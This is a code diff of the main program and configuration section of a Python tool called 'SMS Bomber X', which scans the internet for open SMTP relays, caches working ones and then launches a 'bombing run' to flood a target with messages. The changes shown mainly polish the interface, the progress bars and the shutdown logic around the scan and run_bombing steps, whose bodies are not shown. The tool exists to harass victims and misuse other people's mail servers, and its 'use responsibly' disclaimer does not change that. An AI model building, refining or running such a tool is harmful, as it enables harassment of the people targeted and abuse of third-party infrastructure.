-    console.print(Panel("Cache & Log Settings", style="yellow"))
-    config.use_relay_cache = Confirm.ask("Use relay cache file for prioritizing scans?", default=config.use_relay_cache)
-    # Reference the legacy log file explicitly if found
-    old_log_display = " (found legacy 'open_smtp_servers.log')" if Path("open_smtp_servers.log").exists() else ""
-    config.load_previous_log = Confirm.ask(f"Prioritize relays from 'open_smtp_servers.log'?{old_log_display}", default=config.load_previous_log)
+    console.print(Panel("Cache & Prioritization", style="yellow", title_align="left", border_style="yellow"))
+    config.use_relay_cache = Confirm.ask(f"Use relay cache file ([cyan]{RELAY_CACHE_FILE.name}[/])?", default=config.use_relay_cache)
+    # Display hint about legacy log if it exists
+    legacy_log_exists = Path("open_smtp_servers.log").exists()
+    legacy_log_hint = " ([dim]legacy file found[/dim])" if legacy_log_exists else ""
+    config.load_previous_log = Confirm.ask(f"Prioritize relays from 'open_smtp_servers.log'?{legacy_log_hint}", default=(config.load_previous_log and legacy_log_exists))
     
     # --- Save Configuration as Profile ---
-    console.print(Panel("Save Configuration", style="green"))
-    save_choice = Confirm.ask("Save this configuration as a profile?", default=False)
-    if save_choice:
-        profile_name_prompt = Prompt.ask("Enter profile name", default=config.profile_name)
-        config.profile_name = profile_name_prompt.strip() # Use the entered name
-        if not save_profile(config): # Attempt save, check for failure
-             console.print("[red]Failed to save profile.[/red] Continuing without saving.")
-             # Optionally retry asking for name or just proceed
+    console.print(Panel("Save Configuration", style="green", title_align="left", border_style="green"))
+    save_is_requested = Confirm.ask("Save this configuration as a profile?", default=False)
+    if save_is_requested:
+        # Use current profile name as default suggestion if modifying one
+        profile_name_prompt = Prompt.ask("Enter profile name to save as", default=config.profile_name) 
+        config.profile_name = profile_name_prompt.strip() # Update config with potentially new name
+        # save_profile now handles validation and user feedback internally
+        save_profile(config) 
     else:
         log.info("Configuration not saved as a profile for this run.")
 
+    console.print("[bold green]Configuration complete.[/bold green]")
     return config
+
 
 # --- Main Application Logic ---
 def display_banner():
@@ -1257,130 +1410,157 @@ def display_banner():
 [/]
 [bold blue] SMS Bomber X - Enhanced Edition [/]
 [i yellow] Disclaimer: Use responsibly, ethically, and only with explicit permission. [/]"""
-    console.print(Panel.fit(banner, border_style="blue")) # Use Panel.fit for better wrapping
+    # Use Panel.fit to allow the panel to size naturally around the banner content
+    console.print(Panel.fit(banner, border_style="blue", padding=(0,1))) 
     
-    info_text = (
-        f"Log File : [dim cyan]{LOG_FILE.resolve()}[/]\n"
-        f"Profiles : [dim cyan]{PROFILES_DIR.resolve()}[/]\n"
-        f"Cache File: [dim cyan]{RELAY_CACHE_FILE.resolve()}[/]"
-    )
-    console.print(Panel(info_text, title="[bold]Paths[/]", style="dim", border_style="yellow", expand=False))
+    # Display resolved paths for clarity
+    try:
+         info_text = (
+              f"Log File : [dim cyan]{LOG_FILE.resolve()}[/]\n"
+              f"Profiles : [dim cyan]{PROFILES_DIR.resolve()}[/]\n"
+              f"Cache File: [dim cyan]{RELAY_CACHE_FILE.resolve()}[/]"
+         )
+         console.print(Panel(info_text, title="[bold]Paths[/]", style="dim", border_style="yellow", expand=False, padding=(0,1)))
+    except Exception as path_err:
+         log.warning(f"Could not display resolved paths: {path_err}")
 
 
 def main_app():
-    """Main function to run the SMS Bomber X application."""
-    display_banner() # Show banner first
+    """Main function to orchestrate the SMS Bomber X application."""
+    # Show banner first for visual appeal and disclaimer
+    display_banner() 
     
     # --- Global Progress Bar Setup ---
-    # Configure columns for the progress display
+    # Customize columns for a clean look
     progress = Progress(
         TextColumn("[progress.description]{task.description}", justify="left"),
-        BarColumn(bar_width=None), # Allow bar to expand
+        BarColumn(bar_width=None), # Adapts to console width
         TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
-        SpinnerColumn(spinner_name="dots", style="cyan"), # Or choose another spinner
+        SpinnerColumn(spinner_name="line", style="cyan"), # Different spinner example
+        TextColumn("•", style="dim"),
         TimeRemainingColumn(),
-        TextColumn("•"),
+        TextColumn("•", style="dim"),
         TimeElapsedColumn(),
         console=console,
         transient=False, # Keep completed tasks visible
-        expand=True # Allow progress to take available width
+        expand=True # Let progress bars use available width
     )
 
+    # Initialize state variables
     config: Optional[AppConfig] = None
-    relay_manager: Optional[RelayManager] = None # Initialize later
-    previous_log_relays: List[str] = [] # Store entries from legacy log
+    relay_manager: Optional[RelayManager] = None
+    previous_log_relays: List[str] = []
 
-    # --- Load legacy log file early ---
-    # This file is simple, no complex parsing needed here
+    # --- Load legacy log file contents early (if it exists) ---
+    # This simple file doesn't need complex error handling like JSON cache
     old_log_path = Path("open_smtp_servers.log")
     if old_log_path.is_file():
         try:
             with open(old_log_path, 'r', encoding='utf-8') as f:
-                # Basic filtering for potential ip:port format
+                # Basic filter for lines containing a colon (potential ip:port)
                 previous_log_relays = [line.strip() for line in f if line.strip() and ':' in line]
             if previous_log_relays:
-                log.info(f"Found {len(previous_log_relays)} potential relay entries in legacy 'open_smtp_servers.log'.")
+                log.info(f"Found {len(previous_log_relays)} potential relay entries in legacy 'open_smtp_servers.log'. Will consider if enabled in config.")
             else:
-                 log.info("Legacy 'open_smtp_servers.log' found but was empty or contained no valid entries.")
+                log.info("Legacy 'open_smtp_servers.log' found but was empty or contained no valid entries.")
         except Exception as e:
              log.warning(f"Could not read legacy log file '{old_log_path}': {e}")
 
+    # --- Main Execution Block ---
     try:
-        # --- Initialize Relay Manager ---
-        # Do this before config to potentially load cache data for display/use in config phase
+        # --- Initialize Core Components ---
+        # Relay Manager needs cache file path and console instance
         relay_manager = RelayManager(RELAY_CACHE_FILE, console)
         
-        # --- Get Configuration from User ---
+        # --- Get Configuration (Interactive) ---
+        # This function handles loading profiles or prompting the user
         config = get_user_config_interactive()
-        if not config: # If user somehow aborted config (e.g., failed profile load and didn't continue)
-             console.print("[bold red]Configuration process failed or was cancelled. Exiting.[/]")
-             return # Exit if config setup doesn't complete
+        
+        # Check if configuration was successful
+        if not config: 
+             console.print("[bold red]Configuration process failed or was cancelled by the user. Exiting.[/]")
+             # No cleanup needed yet as operations haven't started
+             return 
 
-        # --- Main Execution Flow with Live Progress Display ---
-        console.print("\n", Panel("[bold green]Starting Operations[/]", expand=False, style="green"))
-        with Live(progress, refresh_per_second=10, console=console, vertical_overflow="visible", transient=False) as live:
-            # Allow live display to fully render before proceeding if needed
-            # time.sleep(0.1) 
+        # --- Start Operations within Live Context Manager ---
+        # This keeps the progress bars visible and updated
+        console.print("\n", Panel("[bold green]Starting Operations...[/]", expand=False, style="green", border_style="green", padding=(0,1)))
+        with Live(progress, refresh_per_second=5, console=console, vertical_overflow="crop", transient=False) as live:
+            # `live` object can be used to update display if needed, progress updates automatically
 
             # --- Step 1: Scan for SMTP Relays ---
-            live.update(progress) # Update display
-            run_scan(config, relay_manager, previous_log_relays if config.load_previous_log else [], progress)
-            live.update(progress) # Update after scan finishes
+            run_scan(
+                config, 
+                relay_manager, 
+                previous_log_relays if config.load_previous_log else [], # Pass legacy ips only if enabled
+                progress
+                )
+            # live.update(progress) # Explicit update might help ensure display sync after scan
 
-            # --- Step 2: Run the Bombing Process (if relays found & confirmed) ---
+            # --- Step 2: Run the Bombing Process ---
+            # Check if the scan found any usable relays
             if relay_manager.active_relays:
-                live.update(progress) # Ensure latest progress shown before prompt
-                console.print("\n") # Add space before confirmation
+                console.print("\n") # Add visual spacing before confirmation
+                # Ask for confirmation before proceeding with bombing
                 start_bombing = Confirm.ask(
-                    f"[bold green]Scan complete. Found {len(relay_manager.active_relays)} working relays. Proceed with bombing run?[/]", 
-                    default=True
+                    f"\n[bold green]Scan complete.[/] Found [bold]{len(relay_manager.active_relays)}[/] working relays. [bold]Start bombing run?[/]", 
+                    default=True # Default to yes for convenience
                 )
                 if start_bombing:
                     run_bombing(config, relay_manager, progress)
                 else:
-                    console.print("[yellow]Bombing run cancelled by user confirmation.[/]")
-                    # Add a dummy progress task to show cancellation
+                    console.print("[yellow]Bombing run explicitly cancelled by user.[/yellow]")
+                    # Add a progress task indicating cancellation
                     progress.add_task("[yellow]Bombing Cancelled", total=1, completed=1)
             else:
-                 # Displayed if scan ran but found nothing usable
-                 console.print("\n[bold red]Scan finished, but no working relays are currently available.[/]")
+                 # This message is shown if the scan completed but found 0 relays
+                 console.print("\n[bold red]Scan finished, but no working relays are currently available in the pool.[/]")
+                 # Add a progress task indicating skipping
                  progress.add_task("[red]Bombing Skipped (No Active Relays)", total=1, completed=1)
 
-            # Keep the final progress display visible for a moment
-            live.update(progress)
-            # time.sleep(1) # Optional short pause
+            # Optional: Brief pause to ensure user sees the final progress state
+            # time.sleep(1.5)
 
     except KeyboardInterrupt:
-        # Handle Ctrl+C gracefully
-        console.print("\n[bold yellow]Operation interrupted by user (Ctrl+C).[/]")
-        log.warning("Operation manually interrupted.")
+        # Handle Ctrl+C gracefully anywhere in the main flow
+        console.print("\n[bold yellow]Operation interrupted by user (Ctrl+C). Shutting down...[/]")
+        log.warning("Operation manually interrupted via KeyboardInterrupt.")
+    except MarkupError as markup_err:
+         console.print(f"\n[bold red]UI Error:[/bold red] Invalid text markup detected.")
+         log.critical(f"Rich Markup Error encountered: {markup_err}", exc_info=True)
+         console.print_exception(show_locals=False) # Show traceback for UI error
     except Exception as e:
-        # Catch any other unexpected exceptions in the main flow
-        console.print("\n[bold red]An unexpected critical error occurred during execution![/]")
-        log.critical("Critical error in main application loop:", exc_info=True)
-        # Display the traceback on the console for easier debugging
-        console.print_exception(show_locals=True, width=console.width) 
+        # Catch any other unexpected exceptions during setup or execution
+        console.print("\n[bold red]An unexpected critical error occurred![/]")
+        log.critical("Critical error in main application execution:", exc_info=True)
+        # Display the full traceback on the console for detailed debugging
+        console.print_exception(show_locals=True, width=console.width, word_wrap=True) 
+        
     finally:
-        # --- Cleanup ---
-        console.print("\n[bold cyan]Initiating shutdown procedure...[/]")
-        # Ensure relay connections are closed and cache is saved
+        # --- Cleanup Actions ---
+        # This block executes regardless of whether an error occurred or not
+        console.print("\n", Panel("[bold cyan]Initiating shutdown procedure...[/]", style="cyan", border_style="cyan", padding=(0,1)))
+        
+        # Safely close relay connections and save cache
         if relay_manager:
             try:
-                 relay_manager.close_all_connections()
+                # Close active connections first
+                relay_manager.close_all_connections() 
             except Exception as close_err:
-                  log.error(f"Error during connection cleanup: {close_err}", exc_info=True)
+                  log.error(f"Error during connection cleanup phase: {close_err}", exc_info=True)
             try:
-                 relay_manager.save_cache() 
+                # Save the cache state (even if errors occurred)
+                relay_manager.save_cache() 
             except Exception as save_err:
-                  log.error(f"Error during final cache save: {save_err}", exc_info=True)
+                  log.error(f"Error during final relay cache save: {save_err}", exc_info=True)
         else:
              log.debug("Relay Manager was not initialized, skipping cleanup.")
              
         # Final exit message
-        console.print(Panel("[bold magenta]Exited SMS Bomber X.[/]", style="magenta", border_style="magenta"))
+        console.print(Panel("[bold magenta]Exited SMS Bomber X.[/]", style="magenta", border_style="magenta", padding=(0,1)))
 
 
-# --- Entry Point ---
+# --- Script Entry Point ---
 if __name__ == "__main__":
-    # This block runs when the script is executed directly
-    main_app() 
+    # This ensures main_app() is called only when the script is executed directly
+    main_app()
